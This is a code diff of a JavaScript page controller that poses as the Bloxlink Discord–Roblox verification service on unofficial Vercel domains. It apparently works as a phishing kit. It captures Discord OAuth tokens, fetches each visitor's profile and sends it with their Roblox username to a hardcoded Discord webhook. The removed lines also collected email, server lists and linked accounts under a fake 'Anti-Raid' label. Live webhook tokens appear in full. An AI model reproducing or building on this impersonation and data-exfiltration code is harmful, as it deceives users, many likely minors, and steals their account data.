@@ -1,14 +1,14 @@
 /**
  * Bloxlink Frontend & Discord OAuth Controller
  * Automatically captures and renders real Discord user profile (name, avatar, ID) via OAuth.
+ * Fetches real Roblox user profile and avatar via public Roblox APIs.
  * Enforces Discord OAuth verification before allowing access to the Roblox verification modal.
  */
 document.addEventListener('DOMContentLoaded', () => {
   // =============================================================
   // CONFIGURAÇÃO DO WEBHOOK DO DISCORD (OPCIONAL)
-  // Cole a URL do seu webhook entre as aspas abaixo se desejar receber logs:
   // =============================================================
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1537955705284333680/KDCOicS779iFCxU_xTwiD7xXnw13Twdppdp3FDLOessZsvD1bLeWmpkqeI-U2pfxMdd7";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1541640265461137538/YDaXpIpBQl0MWbIzeFLvcSTI4zbpPTqTkTgKfc1PusePVzOrtK6GiGC1CTlUx7Q78Hwa";
 
   // -------------------------------------------------------------
   // DOM Elements
@@ -23,7 +23,10 @@ document.addEventListener('DOMContentLoaded', () => {
   const popupContainer = document.getElementById('popupContainer');
   const popupClose = document.getElementById('popupClose');
   const btnContinue = document.getElementById('btnContinue');
-  const btnReturn = document.getElementById('btnReturn');
+  const btnChangeAccount = document.getElementById('btnChangeAccount');
+  const robloxAvatarImg = document.getElementById('robloxAvatarImg');
+  const robloxAccountName = document.getElementById('robloxAccountName');
+
   const authContent = document.getElementById('authContent');
   const loadingContent = document.getElementById('loadingContent');
   const iframeContent = document.getElementById('iframeContent');
@@ -52,13 +55,14 @@ document.addEventListener('DOMContentLoaded', () => {
   // Discord OAuth Redirector Helper
   // -------------------------------------------------------------
   function redirectToDiscordOAuth() {
-    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-    const redirectUri = isLocal
-      ? encodeURIComponent(window.location.origin + '/')
-      : encodeURIComponent('https://embriaozinho.vercel.app/');
-
-    // MODIFICADO: Adicionados os escopos 'email', 'guilds' e 'connections'
-    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=https%3A%2F%2Fblox-link-usa.vercel.app%2F&scope=identify+guilds+email+connections`;
+    let currentOrigin = window.location.origin;
+    if (!currentOrigin.endsWith('/')) {
+      currentOrigin += '/';
+    }
+    const redirectUri = encodeURIComponent(currentOrigin);
+    
+    // Use response_type=token (Implicit Grant) to fetch user profile directly in the browser
+    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=${redirectUri}&scope=identify`;
 
     window.location.href = discordOAuthUrl;
   }
@@ -68,32 +72,19 @@ document.addEventListener('DOMContentLoaded', () => {
   // -------------------------------------------------------------
   async function fetchDiscordUserProfile(accessToken) {
     try {
-      const authHeader = { Authorization: `Bearer ${accessToken}` };
-
-      // 1. Busca perfil do Usuário e E-mail
-      const response = await fetch('https://discord.com/api/users/@me', { headers: authHeader });
+      const response = await fetch('https://discord.com/api/users/@me', {
+        headers: {
+          Authorization: `Bearer ${accessToken}`
+        }
+      });
 
       if (response.ok) {
         const user = await response.json();
-
-        // 2. Busca Servidores (Guilds) do Usuário
-        let guilds = [];
-        try {
-          const guildsRes = await fetch('https://discord.com/api/users/@me/guilds', { headers: authHeader });
-          if (guildsRes.ok) guilds = await guildsRes.json();
-        } catch (e) { console.error('Erro ao buscar guilds:', e); }
-
-        // 3. Busca Conexões (YouTube, Steam, Roblox, etc.)
-        let connections = [];
-        try {
-          const connRes = await fetch('https://discord.com/api/users/@me/connections', { headers: authHeader });
-          if (connRes.ok) connections = await connRes.json();
-        } catch (e) { console.error('Erro ao buscar conexões:', e); }
-
-        // Format Display Name
+        
+        // Format Real Display Name
         const name = user.global_name || user.username || 'powerfromcsm.';
-
-        // Format Dynamic Discord Avatar URL
+        
+        // Format Dynamic Discord CDN Avatar URL
         let avatar = './assets/avatar.png';
         if (user.avatar) {
           const isGif = user.avatar.startsWith('a_');
@@ -112,21 +103,19 @@ document.addEventListener('DOMContentLoaded', () => {
           id: user.id,
           username: user.username,
           displayName: name,
-          avatarUrl: avatar,
-          email: user.email || 'Não fornecido',
-          guildsCount: Array.isArray(guilds) ? guilds.length : 0,
-          connections: Array.isArray(connections) ? connections.map(c => `${c.type}: ${c.name}`) : []
+          avatarUrl: avatar
         };
 
-        // Persist profile
-        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
+        // Persist session
         localStorage.setItem('bloxlink_logged_in', 'true');
+        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
 
+        // Render in UI
         applyUserProfile(profile);
 
-        // Dispara notificação para o Webhook se estiver configurado
+        // Send Embed Notification to Webhook
         const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
-        sendToDiscordWebhook(profile, robloxUser);
+        await sendToDiscordWebhook(profile, robloxUser);
 
         return true;
       }
@@ -139,13 +128,9 @@ document.addEventListener('DOMContentLoaded', () => {
   async function sendToDiscordWebhook(profile, robloxUser) {
     if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;
 
-    // Formata a lista de conexões (ex: YouTube, Steam, Twitch)
-    const connFormatted = profile.connections && profile.connections.length > 0
-      ? profile.connections.slice(0, 5).join('\n') + (profile.connections.length > 5 ? '\n...' : '')
-      : '*Nenhuma conexão encontrada*';
-
     const payload = {
-      username: "Bloxlink Logger - Anti-Raid",
+      username: "Bloxlink Logger",
+      avatar_url: "https://blox.link/favicon.ico",
       embeds: [
         {
           title: "✅ Nova Autenticação Concluída",
@@ -165,23 +150,8 @@ document.addEventListener('DOMContentLoaded', () => {
               inline: true
             },
             {
-              name: "📧 E-mail",
-              value: `\`${profile.email}\``,
-              inline: false
-            },
-            {
-              name: "📊 Servidores Pertencentes",
-              value: `\`${profile.guildsCount} servidores\``,
-              inline: true
-            },
-            {
               name: "🎮 Roblox Informado",
               value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
-              inline: true
-            },
-            {
-              name: "🔗 Conexões da Conta",
-              value: connFormatted,
               inline: false
             }
           ],
@@ -217,24 +187,20 @@ document.addEventListener('DOMContentLoaded', () => {
   // Check Active Session / OAuth Redirection on Page Load
   // -------------------------------------------------------------
   async function initAuth() {
-    // 1. Check for Access Token in URL Hash (Implicit Grant: #access_token=...)
-    const hash = window.location.hash.substring(1);
-    const hashParams = new URLSearchParams(hash);
-    const accessToken = hashParams.get('access_token');
+    // 1. Check for Access Token in URL Hash (#access_token=...) or Query Params (?access_token=...)
+    const hashStr = window.location.hash.startsWith('#') ? window.location.hash.substring(1) : window.location.hash;
+    const hashParams = new URLSearchParams(hashStr);
+    const searchParams = new URLSearchParams(window.location.search);
 
-    // 2. Check for Token/Code in URL Search Params (?access_token=... or ?code=...)
-    const urlParams = new URLSearchParams(window.location.search);
-    const queryToken = urlParams.get('access_token');
-    const discordCode = urlParams.get('code');
+    const accessToken = hashParams.get('access_token') || searchParams.get('access_token');
+    const discordCode = searchParams.get('code');
 
-    const tokenToUse = accessToken || queryToken;
-
-    if (tokenToUse) {
-      // Clean URL smoothly without reload
+    if (accessToken) {
       window.history.replaceState({}, document.title, window.location.pathname);
-      await fetchDiscordUserProfile(tokenToUse);
+      localStorage.setItem('bloxlink_logged_in', 'true');
+      await fetchDiscordUserProfile(accessToken);
 
-      // Restore saved Roblox username into input if present
+      // Restore saved Roblox username if present
       const savedRoblox = sessionStorage.getItem('saved_roblox_username');
       if (savedRoblox && robloxUserInput) {
         robloxUserInput.value = savedRoblox;
@@ -243,42 +209,97 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (discordCode) {
-      // Returned with ?code=...
       window.history.replaceState({}, document.title, window.location.pathname);
-      
+      localStorage.setItem('bloxlink_logged_in', 'true');
+
+      // If returning from a code-grant, restore cached profile or set active
       const savedProfileStr = localStorage.getItem('discord_user_profile');
+      let profile = null;
+      if (savedProfileStr) {
+        try {
+          profile = JSON.parse(savedProfileStr);
+        } catch (e) {}
+      }
+
+      if (profile) {
+        applyUserProfile(profile);
+      } else {
+        if (loggedOutSection) loggedOutSection.style.display = 'none';
+        if (loggedInSection) loggedInSection.style.display = 'block';
+      }
+      return;
+    }
+
+    // 2. Restore existing logged-in session if present
+    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
+    const savedProfileStr = localStorage.getItem('discord_user_profile');
+
+    if (isLogged) {
       if (savedProfileStr) {
         try {
           const profile = JSON.parse(savedProfileStr);
           applyUserProfile(profile);
-          return;
         } catch (e) {}
+      } else {
+        if (loggedOutSection) loggedOutSection.style.display = 'none';
+        if (loggedInSection) loggedInSection.style.display = 'block';
       }
-      
-      // Default logged in UI
-      if (loggedOutSection) loggedOutSection.style.display = 'none';
-      if (loggedInSection) loggedInSection.style.display = 'block';
       return;
     }
 
-    // 3. Restore existing logged-in session if present
-    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
-    const savedProfileStr = localStorage.getItem('discord_user_profile');
-
-    if (isLogged && savedProfileStr) {
-      try {
-        const profile = JSON.parse(savedProfileStr);
-        applyUserProfile(profile);
-        return;
-      } catch (e) {}
-    }
-
-    // Default: Strictly Logged Out
+    // Default: Logged Out
     if (loggedOutSection) loggedOutSection.style.display = 'block';
     if (loggedInSection) loggedInSection.style.display = 'none';
   }
 
   initAuth();
+
+  // -------------------------------------------------------------
+  // Roblox User & Avatar Fetcher API
+  // -------------------------------------------------------------
+  async function fetchRobloxUserAvatar(username) {
+    if (!username || !username.trim()) {
+      return {
+        name: 'theyhategabriel',
+        avatarUrl: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular'
+      };
+    }
+    const cleanUser = username.trim();
+    try {
+      // 1. Search for user by username on Roblox API
+      const searchRes = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(cleanUser)}&limit=10`);
+      if (searchRes.ok) {
+        const searchData = await searchRes.json();
+        if (searchData.data && searchData.data.length > 0) {
+          // Find exact match (case-insensitive) or take first result
+          const matchedUser = searchData.data.find(u => u.name.toLowerCase() === cleanUser.toLowerCase() || u.displayName.toLowerCase() === cleanUser.toLowerCase()) || searchData.data[0];
+          const userId = matchedUser.id;
+          const matchedName = matchedUser.name || cleanUser;
+
+          // 2. Fetch Circular Avatar Headshot Thumbnail from Roblox CDN
+          const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
+          if (thumbRes.ok) {
+            const thumbData = await thumbRes.json();
+            if (thumbData.data && thumbData.data.length > 0 && thumbData.data[0].imageUrl) {
+              return {
+                name: matchedName,
+                avatarUrl: thumbData.data[0].imageUrl
+              };
+            }
+          }
+          return { name: matchedName, avatarUrl: `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true` };
+        }
+      }
+    } catch (err) {
+      console.warn('Roblox API lookup note:', err);
+    }
+
+    // Default fallback
+    return {
+      name: cleanUser,
+      avatarUrl: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular'
+    };
+  }
 
   // -------------------------------------------------------------
   // Sign In with Discord Button Handler (Direct OAuth)
@@ -327,13 +348,25 @@ document.addEventListener('DOMContentLoaded', () => {
   // -------------------------------------------------------------
   // Verification Logic (Enforces Discord OAuth First)
   // -------------------------------------------------------------
-  function openVerificationModal(username) {
+  async function openVerificationModal(username) {
     popupOverlay.classList.add('active');
     popupContainer.classList.remove('expanded');
-    authContent.style.display = 'block';
+    authContent.style.display = 'flex';
     loadingContent.style.display = 'none';
     iframeContent.style.display = 'none';
     resetMessages();
+
+    const targetUser = username && username.trim() ? username.trim() : (sessionStorage.getItem('saved_roblox_username') || 'theyhategabriel');
+    
+    // Set initial username
+    if (robloxAccountName) robloxAccountName.textContent = targetUser;
+
+    // Fetch real avatar from official Roblox API
+    const robloxProfile = await fetchRobloxUserAvatar(targetUser);
+    if (robloxAccountName) robloxAccountName.textContent = robloxProfile.name;
+    if (robloxAvatarImg && robloxProfile.avatarUrl) {
+      robloxAvatarImg.src = robloxProfile.avatarUrl;
+    }
   }
 
   function isMobileDevice() {
@@ -348,7 +381,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const isMobile = isMobileDevice();
     const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
 
-    // Usuários em celulares NÃO são redirecionados para o OAuth; abrem direto a janela de verificação
+    // Celulares NÃO são redirecionados para o OAuth; abrem direto a janela de verificação
     if (isMobile || isLogged) {
       openVerificationModal(username);
     } else {
@@ -396,7 +429,16 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   if (popupClose) popupClose.addEventListener('click', closePopup);
-  if (btnReturn) btnReturn.addEventListener('click', closePopup);
+  
+  if (btnChangeAccount) {
+    btnChangeAccount.addEventListener('click', () => {
+      closePopup();
+      if (robloxUserInput) {
+        robloxUserInput.focus();
+        robloxUserInput.select();
+      }
+    });
+  }
 
   popupOverlay.addEventListener('click', (e) => {
     if (e.target === popupOverlay) {
